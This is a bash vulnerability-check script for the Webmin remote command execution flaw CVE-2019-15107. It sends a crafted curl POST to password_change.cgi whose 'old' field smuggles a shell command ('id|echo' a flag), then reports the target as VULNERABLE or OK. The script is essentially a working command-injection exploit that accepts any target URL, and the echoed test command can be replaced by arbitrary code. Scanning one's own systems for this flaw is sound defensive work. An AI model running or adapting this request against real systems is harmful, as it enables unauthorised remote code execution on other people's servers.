FLAG="f3a0c13c3765137bcde68572707ae5c0"
URI=$1;

echo -n "Testing for RCE (CVE-2019-15107) on $URI: ";
curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URI'/session_login.cgi'|grep $FLAG>/dev/null 2>&1

if [ $? -eq 0 ];
then
	echo '\033[0;31mVULNERABLE!\033[0m'
else
	echo '\033[0;32mOK! (target is not vulnerable)\033[0m'
fi
